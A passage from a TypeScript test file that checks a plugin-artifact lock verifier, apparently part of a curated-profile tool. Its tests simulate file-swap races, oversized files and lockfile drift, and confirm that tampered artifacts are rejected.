      return { ...actual, realpathSync: mockedRealpath }
    })
    try {
      const commands = await import('../src/index.ts')
      const candidate = artifactCandidate({ treeSha256: fixtureTreeSha256(packageDir) })
      const result = commands.runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        artifactResolver: {
          resolve: () => ({
            packageDir,
            repository: candidate.repository,
            commit: candidate.commit,
            sourceContentSha256: fixtureShaA,
            changedPaths: [],
          }),
        },
      })

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('simulated canonical file failure')
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('does not translate an unexpected artifact reference failure', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-reference-failure-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      let nativeCalls = 0
      const mockedRealpath = actual.realpathSync.bind(undefined)
      mockedRealpath.native = ((path: Parameters<typeof actual.realpathSync.native>[0]) => {
        nativeCalls += 1
        if (nativeCalls === 14) {
          throw new Error('simulated artifact reference failure')
        }
        return actual.realpathSync.native(path)
      }) as typeof actual.realpathSync.native
      return {
        ...actual,
        realpathSync: mockedRealpath,
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const candidate = artifactCandidate({ treeSha256: fixtureTreeSha256(packageDir) })
      const result = commands.runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        artifactResolver: {
          resolve: () => ({
            packageDir,
            repository: candidate.repository,
            commit: candidate.commit,
            sourceContentSha256: fixtureShaA,
            changedPaths: [],
          }),
        },
      })

      expect(result.stdout).toContain('simulated artifact reference failure')
      expect(result.stdout).not.toContain('artifact-file-not-regular')
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it.each(['symlink', 'file'] as const)(
    'rejects an artifact whose intermediate ancestor becomes a %s during reading',
    async (replacement) => {
      const root = mkdtempSync(join(tmpdir(), 'dsh-curated-intermediate-ancestor-'))
      const packageDir = stageCandidatePackage(root, 'plugin-a', undefined, {
        main: './lib/plugin.mjs',
      })
      const libraryDir = join(packageDir, 'lib')
      const mainPath = join(libraryDir, 'plugin.mjs')
      mkdirSync(libraryDir)
      writeFileSync(mainPath, 'export const nested = true\n')
      const catalogPath = tempFile('catalog.json', artifactCatalog({
        treeSha256: fixtureTreeSha256(packageDir),
      }))
      vi.resetModules()
      vi.doMock('node:fs', async () => {
        const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
        let libraryStats = 0
        return {
          ...actual,
          lstatSync: ((...args: Parameters<typeof actual.lstatSync>) => {
            const stat = actual.lstatSync(...args)
            if (String(args[0]).endsWith('/lib') && ++libraryStats === 2) {
              if (replacement === 'symlink') {
                Object.defineProperty(stat, 'isSymbolicLink', { value: () => true })
              } else {
                Object.defineProperty(stat, 'isDirectory', { value: () => false })
              }
            }
            return stat
          }) as typeof actual.lstatSync,
        }
      })
      try {
        const commands = await import('../src/index.ts')
        const result = commands.runVerifyLock(['--fixture', catalogPath, '--json'], {
          artifactRoots: [root],
          artifactResolver: fixtureArtifactResolver([root]),
        })

        expect(commandIssues(result)).toContainEqual(expect.objectContaining({
          code: 'artifact-file-changed',
          target: 'plugin-a',
        }))
      } finally {
        cleanup(catalogPath)
        rmSync(root, { recursive: true, force: true })
      }
    },
  )

  it('rejects a declared main path that resolves to a directory', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-directory-main-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a', undefined, { main: './lib' })
    mkdirSync(join(packageDir, 'lib'))
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    try {
      const result = runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])

      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-file-not-regular',
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects an oversized artifact file before reading it', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-oversize-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    truncateSync(join(packageDir, 'plugin.mjs'), 16 * 1024 * 1024 + 1)
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256: fixtureShaB }))
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--artifact-root', root, '--json'])

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-file-oversized',
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects an oversized artifact tree before reading file contents', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-tree-oversize-'))
    const packageDir = stageCandidatePackage(root, 'plugin-a')
    for (let index = 0; index < 5; index += 1) {
      const path = join(packageDir, `large-${String(index)}.bin`)
      writeFileSync(path, '')
      truncateSync(path, 13 * 1024 * 1024)
    }
    const catalogPath = tempFile('catalog.json', artifactCatalog({ treeSha256: fixtureShaB }))
    try {
      const result = runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-file-oversized',
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects an artifact file that changes while its descriptor is read', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-read-race-'))
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
    })
    writeFileSync(join(root, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    const packageDir = stageCandidatePackage(root, packageName, undefined, {}, undefined, candidate)
    const catalogPath = join(root, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      const artifactPaths = new Map<number, string>()
      const changedDescriptors = new Set<number>()
      return {
        ...actual,
        openSync: ((path: Parameters<typeof actual.openSync>[0], flags: number) => {
          const descriptor = actual.openSync(path, flags)
          if (String(path).includes(`/node_modules/${packageName}/`)) {
            artifactPaths.set(descriptor, String(path))
          }
          return descriptor
        }) as typeof actual.openSync,
        readSync: ((
          fd: number,
          buffer: NodeJS.ArrayBufferView,
          offset: number,
          length: number,
          position: number | bigint | null,
        ) => {
          const bytesRead = actual.readSync(fd, buffer, offset, length, position)
          const path = artifactPaths.get(fd)
          if (path !== undefined && !changedDescriptors.has(fd)) {
            changedDescriptors.add(fd)
            actual.appendFileSync(path, 'x')
          }
          return bytesRead
        }) as typeof actual.readSync,
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const result = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])

      expect(result.status).toBe(1)
      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-file-changed',
        target: 'plugin-a',
      }))
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects an artifact ancestor replacement without reading the replacement target', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-ancestor-race-'))
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
    })
    writeFileSync(join(root, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    const packageDir = stageCandidatePackage(root, packageName, undefined, {}, undefined, candidate)
    const modulesDir = join(root, 'node_modules')
    const originalModulesDir = join(root, 'node_modules.original')
    const replacementModulesDir = join(root, 'replacement-node-modules')
    cpSync(modulesDir, replacementModulesDir, { recursive: true })
    const replacementMain = join(replacementModulesDir, packageName, 'plugin.mjs')
    writeFileSync(replacementMain, 'export const replacementSecret = "sk-replacement-secret"\n')
    const catalogPath = join(root, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      const originalOpen = actual.openSync
      let replaced = false
      let replacementRead = false
      const replacementDescriptors = new Set<number>()
      return {
        ...actual,
        openSync: ((path: Parameters<typeof actual.openSync>[0], flags: number) => {
          if (!replaced && String(path).endsWith(`/node_modules/${packageName}/plugin.mjs`)) {
            replaced = true
            actual.renameSync(modulesDir, originalModulesDir)
            actual.renameSync(replacementModulesDir, modulesDir)
          }
          const descriptor = originalOpen(path, flags)
          if (replaced && String(path).endsWith(`/node_modules/${packageName}/plugin.mjs`)) {
            replacementDescriptors.add(descriptor)
          }
          return descriptor
        }) as typeof actual.openSync,
        readSync: ((...args: Parameters<typeof actual.readSync>) => {
          if (replacementDescriptors.has(args[0])) replacementRead = true
          return actual.readSync(...args)
        }) as typeof actual.readSync,
        __replacementRead: () => replacementRead,
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const result = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])
      const mockedFs = await import('node:fs') as unknown as typeof import('node:fs') & {
        __replacementRead: () => boolean
      }

      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-file-changed',
        target: 'plugin-a',
      }))
      expect(mockedFs.__replacementRead()).toBe(false)
      expect(result.stdout).not.toContain('sk-replacement-secret')
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('maps a no-follow open failure to a non-regular artifact issue', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-no-follow-'))
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
    })
    writeFileSync(join(root, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    const packageDir = stageCandidatePackage(root, packageName, undefined, {}, undefined, candidate)
    const catalogPath = join(root, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      return {
        ...actual,
        openSync: ((path: Parameters<typeof actual.openSync>[0], flags: number) => {
          if (String(path).endsWith('/plugin.mjs')) {
            throw Object.assign(new Error('simulated no-follow refusal'), { code: 'ELOOP' })
          }
          return actual.openSync(path, flags)
        }) as typeof actual.openSync,
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const result = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])

      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-file-not-regular',
        target: 'plugin-a',
      }))
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('does not relabel an unexpected descriptor-read failure', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-read-failure-'))
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
    })
    writeFileSync(join(root, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    const packageDir = stageCandidatePackage(root, packageName, undefined, {}, undefined, candidate)
    const catalogPath = join(root, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      let mainOpens = 0
      return {
        ...actual,
        openSync: ((path: Parameters<typeof actual.openSync>[0], flags: number) => {
          if (String(path).endsWith('/plugin.mjs')) {
            mainOpens += 1
            if (mainOpens === 2) throw new Error('simulated descriptor-read failure')
          }
          return actual.openSync(path, flags)
        }) as typeof actual.openSync,
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const result = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])

      expect(result.stdout).toContain('simulated descriptor-read failure')
      expect(result.stdout).not.toContain('artifact-file-not-regular')
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('caps descriptor reads when a file grows past its initial size', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-growing-read-'))
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
    })
    writeFileSync(join(root, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    const packageDir = stageCandidatePackage(root, packageName, undefined, {}, undefined, candidate)
    const catalogPath = join(root, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      const growingDescriptors = new Set<number>()
      let mainOpens = 0
      return {
        ...actual,
        openSync: ((path: Parameters<typeof actual.openSync>[0], flags: number) => {
          const descriptor = actual.openSync(path, flags)
          if (String(path).endsWith('/plugin.mjs')) {
            mainOpens += 1
            if (mainOpens === 2) growingDescriptors.add(descriptor)
          }
          return descriptor
        }) as typeof actual.openSync,
        readSync: ((
          fd: number,
          buffer: NodeJS.ArrayBufferView,
          offset: number,
          length: number,
          position: number | bigint | null,
        ) => growingDescriptors.has(fd)
          ? length
          : actual.readSync(fd, buffer, offset, length, position)) as typeof actual.readSync,
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const result = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])

      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-file-oversized',
        target: 'plugin-a',
      }))
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects a descriptor that is no longer a regular file when opened', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-open-type-race-'))
    const packageName = 'plugin-a'
    const npmVersion = '1.0.0'
    const npmIntegrity = fixtureNpmIntegrity
    const candidate = artifactCandidate({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
    })
    writeFileSync(join(root, 'package.json'), JSON.stringify({
      name: 'dsh-profile-fixture-curated',
      dependencies: { [packageName]: npmVersion },
      dsh: { profile: { bundles: [packageName] } },
    }))
    const packageDir = stageCandidatePackage(root, packageName, undefined, {}, undefined, candidate)
    const catalogPath = join(root, 'catalog.json')
    writeFileSync(catalogPath, artifactCatalog({
      npmVersion,
      npmIntegrity,
      targetProfiles: ['fixture-curated'],
      treeSha256: fixtureTreeSha256(packageDir),
    }))
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      const targetDescriptors = new Set<number>()
      return {
        ...actual,
        openSync: ((path: Parameters<typeof actual.openSync>[0], flags: number) => {
          const descriptor = actual.openSync(path, flags)
          if (String(path).endsWith('/plugin.mjs')) targetDescriptors.add(descriptor)
          return descriptor
        }) as typeof actual.openSync,
        fstatSync: ((descriptor: number, options?: { bigint?: boolean }) => {
          const stat = actual.fstatSync(descriptor, options as { bigint: true })
          if (!targetDescriptors.has(descriptor)) return stat
          Object.defineProperty(stat, 'isFile', { value: () => false })
          return stat
        }) as typeof actual.fstatSync,
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const result = commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        root,
        '--json',
      ])

      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'artifact-file-not-regular',
        target: 'plugin-a',
      }))
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('verifies a materialized hoisted profile installed from local Git package subdirectories', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-materialized-git-'))
    const repositoryDir = join(home, 'fixture.git')
    const isolatedHome = join(home, 'user-home')
    mkdirSync(repositoryDir)
    mkdirSync(isolatedHome)
    const selectedCandidates = [admittedCandidate('dsh-web-search-pro')]
    writeLocalGitProfileFixture(repositoryDir, selectedCandidates)
    expect(spawnSync('git', ['init', '--quiet', '--initial-branch=main'], { cwd: repositoryDir }).status).toBe(0)
    expect(spawnSync('git', ['add', '.'], { cwd: repositoryDir }).status).toBe(0)
    expect(spawnSync('git', [
      '-c',
      'user.name=DSH Test',
      '-c',
      'user.email=dsh-test@example.invalid',
      'commit',
      '--quiet',
      '-m',
      'curated fixture',
    ], { cwd: repositoryDir }).status).toBe(0)
    const commit = spawnSync('git', ['rev-parse', 'HEAD'], {
      cwd: repositoryDir,
      encoding: 'utf8',
    }).stdout.trim()
    const repository = 'https://github.com/example/curated-local-git-fixture'
    const localRepository = pathToFileURL(repositoryDir).href
    const fixtureCatalog = {
      ...loadCuratedCatalog(),
      candidates: selectedCandidates.map(candidate => ({
        ...candidate,
        repository,
        repositoryPath: fixtureRepositoryPath(candidate),
        commit,
        npmVersion: undefined,
        npmIntegrity: undefined,
        manifestPath: 'package.json',
        nodeEngine: '^22.19.0 || >=24.0.0',
        nodeEngineEvidence: 'package.json#engines.node',
        requiresCorePatch: false,
        license: 'MIT',
        bundlePatch: './cordis.patch.yml',
        installScripts: {},
        externalDependencies: [],
        runtimeDependencyClosureSha256: emptyRuntimeDependencyClosureSha,
        targetProfiles: ['web-curated'],
        active: true,
        auditWarnings: [],
        rejections: [],
      })),
    }
    const catalogPath = join(home, 'catalog.json')
    writeFileSync(catalogPath, JSON.stringify(fixtureCatalog))
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      const mockedReadFileSync = ((
        path: Parameters<typeof readFileSync>[0],
        options?: Parameters<typeof readFileSync>[1],
      ) => {
        if (String(path).endsWith('plugin-allowlist.yaml')) return JSON.stringify(fixtureCatalog)
        return options === undefined ? actual.readFileSync(path) : actual.readFileSync(path, options)
      }) as typeof readFileSync
      return { ...actual, readFileSync: mockedReadFileSync }
    })
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: (path?: string) => path === undefined
          ? fixtureCatalog
          : actual.loadCuratedCatalog(path),
      }
    })
    const fixtureBundles = [
      ...CURATED_PROFILE_TEMPLATES['web-curated'].bundles,
      ...fixtureCatalog.candidates.flatMap(candidate =>
        candidate.expectedPackage === null ? [] : [candidate.expectedPackage]),
    ]
    vi.doMock('@deepseek-ai/dsh-curated-profiles', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-profiles')>(
        '@deepseek-ai/dsh-curated-profiles',
      )
      return {
        ...actual,
        CURATED_PROFILE_TEMPLATES: {
          ...actual.CURATED_PROFILE_TEMPLATES,
          'web-curated': { bundles: fixtureBundles },
        },
      }
    })
    const profiles = await import('../../curated-profiles/src/index.ts')
    const commands = await import('../src/index.ts')
    const profileRoot = profiles.materializeCuratedProfile('web-curated', home)
    stageEmptyManagedPnpmEvidence(profileRoot)
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      private: true,
      dependencies: Object.fromEntries(fixtureCatalog.candidates.flatMap(candidate =>
        candidate.expectedPackage === null
          ? []
          : [[
            candidate.expectedPackage,
            `git+${candidate.repository}.git#${candidate.commit}&path:${candidate.repositoryPath}`,
          ]])),
      dsh: { profile: { bundles: fixtureBundles } },
    }))
    const generatedManifest = readFileSync(join(profileRoot, 'package.json'), 'utf8')
    const generatedWorkspace = readFileSync(join(profileRoot, 'pnpm-workspace.yaml'), 'utf8')
    const generatedNpmrc = readFileSync(join(profileRoot, '.npmrc'), 'utf8')
    const install = spawnSync('corepack', [
      'pnpm@11.7.0',
      'install',
      '--reporter=append-only',
      '--store-dir',
      join(home, 'store'),
    ], {
      cwd: profileRoot,
      encoding: 'utf8',
      env: {
        ...process.env,
        HOME: isolatedHome,
        NPM_CONFIG_USERCONFIG: join(isolatedHome, '.npmrc'),
        GIT_CONFIG_COUNT: '1',
        GIT_CONFIG_KEY_0: `url.${localRepository}.insteadOf`,
        GIT_CONFIG_VALUE_0: `${repository}.git`,
      },
      timeout: 45_000,
    })
    expect(install.status, `${install.stdout}${install.stderr}`).toBe(0)
    expect(readFileSync(join(profileRoot, 'package.json'), 'utf8')).toBe(generatedManifest)
    expect(readFileSync(join(profileRoot, 'pnpm-workspace.yaml'), 'utf8')).toBe(generatedWorkspace)
    expect(readFileSync(join(profileRoot, '.npmrc'), 'utf8')).toBe(generatedNpmrc)
    for (const candidate of fixtureCatalog.candidates) {
      if (candidate.expectedPackage === null) continue
      candidate.treeSha256 = fixtureTreeSha256(join(profileRoot, 'node_modules', candidate.expectedPackage))
    }
    writeFileSync(catalogPath, JSON.stringify(fixtureCatalog))

    const dependencySpec = `git+${repository}.git#${commit}&path:packages/dsh-web-search-pro`
    type MaterializedLock = {
      importers: { '.': { dependencies: Record<string, { specifier: string; version: string }> } }
      packages: Record<string, {
        resolution: {
          type: string
          repo: string
          commit: string
          path?: string
        }
        version: string
      }>
    }
    const rootLock = loadYaml(readFileSync(join(profileRoot, 'pnpm-lock.yaml'), 'utf8')) as MaterializedLock
    const installedLock = loadYaml(
      readFileSync(join(profileRoot, 'node_modules/.pnpm/lock.yaml'), 'utf8'),
    ) as MaterializedLock
    expect(rootLock.importers['.'].dependencies[SUBDIRECTORY_FIXTURE_PACKAGE]?.specifier).toBe(dependencySpec)
    expect(installedLock.importers['.'].dependencies[SUBDIRECTORY_FIXTURE_PACKAGE]?.specifier).toBe(dependencySpec)
    const resolvedVersion = rootLock.importers['.'].dependencies[SUBDIRECTORY_FIXTURE_PACKAGE]?.version
    expect(resolvedVersion).toBe(dependencySpec)
    expect(installedLock.importers['.'].dependencies[SUBDIRECTORY_FIXTURE_PACKAGE]?.version)
      .toBe(dependencySpec)
    const resolvedPackageKey = `${SUBDIRECTORY_FIXTURE_PACKAGE}@${resolvedVersion as string}`
    expect(rootLock.packages[resolvedPackageKey]?.resolution.path).toBe('packages/dsh-web-search-pro')
    expect(installedLock.packages[resolvedPackageKey]?.resolution.path).toBe('packages/dsh-web-search-pro')
    expect(existsSync(join(profileRoot, 'node_modules', SUBDIRECTORY_FIXTURE_PACKAGE, 'package.json')))
      .toBe(true)
    expect(existsSync(join(
      profileRoot,
      'node_modules',
      SUBDIRECTORY_FIXTURE_PACKAGE,
      '.dsh-curated-artifact.json',
    ))).toBe(false)

    const verify = commands.runVerifyLock([
      '--fixture',
      catalogPath,
      '--artifact-root',
      profileRoot,
      '--json',
    ])
    const preflight = commands.runPreflight(['--profile', 'web-curated', '--json'], { profileRoot })
    const smoke = await commands.runSmokeProfile(['--profile', 'web-curated', '--json'], {
      profileRoot,
      artifactRoots: [profileRoot],
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })
    expect(JSON.parse(verify.stdout)).toMatchObject({ ok: true, observed: true, issues: [] })
    expect(JSON.parse(preflight.stdout)).toMatchObject({ ok: true, observed: true, accepted: true, issues: [] })
    expect(JSON.parse(smoke.stdout)).toMatchObject({ ok: true, observed: true, issues: [] })

    const assertObservedCommandsReject = async (message: string, fallbackRoot?: string): Promise<void> => {
      expect(commands.runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        ...(fallbackRoot === undefined ? [] : [fallbackRoot, '--artifact-root']),
        profileRoot,
        '--json',
      ]).stdout).toContain(message)
      expect(commands.runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
        ...fallbackRoot === undefined ? {} : { artifactRoots: [fallbackRoot] },
      }).stdout)
        .toContain(message)
      expect((await commands.runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot, ...fallbackRoot === undefined ? [] : [fallbackRoot]],
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })).stdout).toContain(message)
    }
    const profileManifest = JSON.parse(generatedManifest) as {
      dependencies: Record<string, string>
    }
    const exactSpec = profileManifest.dependencies[SUBDIRECTORY_FIXTURE_PACKAGE] as string
    for (const [name, driftedSpec] of [
      ['repository', exactSpec.replace('example/curated-local-git-fixture', 'example/other-fixture')],
      ['commit', exactSpec.replace(commit, fixtureCommitC)],
      ['package path', exactSpec.replace('packages/dsh-web-search-pro', 'packages/other')],
    ] as const) {
      profileManifest.dependencies[SUBDIRECTORY_FIXTURE_PACKAGE] = driftedSpec
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify(profileManifest))
      await assertObservedCommandsReject(
        'dsh-web-search-pro profile dependency differs from the catalog repository, commit, or package path',
      )
      expect(driftedSpec, name).not.toBe(exactSpec)
    }
    writeFileSync(join(profileRoot, 'package.json'), generatedManifest)

    const rootLockPath = join(profileRoot, 'pnpm-lock.yaml')
    const installedLockPath = join(profileRoot, 'node_modules/.pnpm/lock.yaml')
    const rootLockText = readFileSync(rootLockPath, 'utf8')
    const installedLockText = readFileSync(installedLockPath, 'utf8')
    const writeDriftedLocks = (mutate: (lock: MaterializedLock) => void): void => {
      for (const [path, text] of [
        [rootLockPath, rootLockText],
        [installedLockPath, installedLockText],
      ] as const) {
        const lock = loadYaml(text) as MaterializedLock
        mutate(lock)
        writeFileSync(path, JSON.stringify(lock))
      }
    }
    Reflect.deleteProperty(rootLock.importers['.'].dependencies, SUBDIRECTORY_FIXTURE_PACKAGE)
    writeFileSync(rootLockPath, JSON.stringify(rootLock))
    await assertObservedCommandsReject('dsh-web-search-pro pnpm dependency must be an object')
    writeFileSync(rootLockPath, rootLockText)
    rootLock.importers['.'].dependencies[SUBDIRECTORY_FIXTURE_PACKAGE] = {
      specifier: dependencySpec,
      version: resolvedVersion as string,
    }

    delete rootLock.packages[`${SUBDIRECTORY_FIXTURE_PACKAGE}@${resolvedVersion as string}`]
    writeFileSync(rootLockPath, JSON.stringify(rootLock))
    await assertObservedCommandsReject('dsh-web-search-pro pnpm package resolution must be an object')
    writeFileSync(rootLockPath, rootLockText)

    const versionWithoutPath = (resolvedVersion as string).replace('&path:packages/dsh-web-search-pro', '')
    expect(versionWithoutPath).not.toBe(resolvedVersion)
    writeDriftedLocks((lock) => {
      const dependency = lock.importers['.'].dependencies[SUBDIRECTORY_FIXTURE_PACKAGE]
      const packageRecord = lock.packages[resolvedPackageKey]
      if (dependency === undefined || packageRecord === undefined) throw new Error('missing fixture lock entry')
      dependency.version = versionWithoutPath
      Reflect.deleteProperty(lock.packages, resolvedPackageKey)
      lock.packages[`${SUBDIRECTORY_FIXTURE_PACKAGE}@${versionWithoutPath}`] = packageRecord
    })
    await assertObservedCommandsReject('dsh-web-search-pro pnpm dependency version differs from the profile manifest')
    writeFileSync(rootLockPath, rootLockText)
    writeFileSync(installedLockPath, installedLockText)

    writeDriftedLocks((lock) => {
      const packageRecord = lock.packages[resolvedPackageKey]
      if (packageRecord === undefined) throw new Error('missing fixture lock package')
      delete packageRecord.resolution.path
    })
    await assertObservedCommandsReject('dsh-web-search-pro pnpm package resolution path differs from the profile manifest')
    writeFileSync(rootLockPath, rootLockText)
    writeFileSync(installedLockPath, installedLockText)

    writeDriftedLocks((lock) => {
      const packageRecord = lock.packages[resolvedPackageKey]
      if (packageRecord === undefined) throw new Error('missing fixture lock package')
      packageRecord.resolution.path = 'packages/other'
    })
    await assertObservedCommandsReject('dsh-web-search-pro pnpm package resolution path differs from the profile manifest')
    writeFileSync(rootLockPath, rootLockText)
    writeFileSync(installedLockPath, installedLockText)

    unlinkSync(installedLockPath)
    await assertObservedCommandsReject('requires root and installed pnpm lockfiles')
    writeFileSync(installedLockPath, installedLockText)

    const externalRoot = join(home, 'external-artifacts')
    const installedPackageDir = join(profileRoot, 'node_modules', SUBDIRECTORY_FIXTURE_PACKAGE)
    const externalPackageDir = join(externalRoot, 'node_modules', SUBDIRECTORY_FIXTURE_PACKAGE)
    mkdirSync(join(externalRoot, 'node_modules'), { recursive: true })
    cpSync(installedPackageDir, externalPackageDir, { recursive: true, dereference: true })
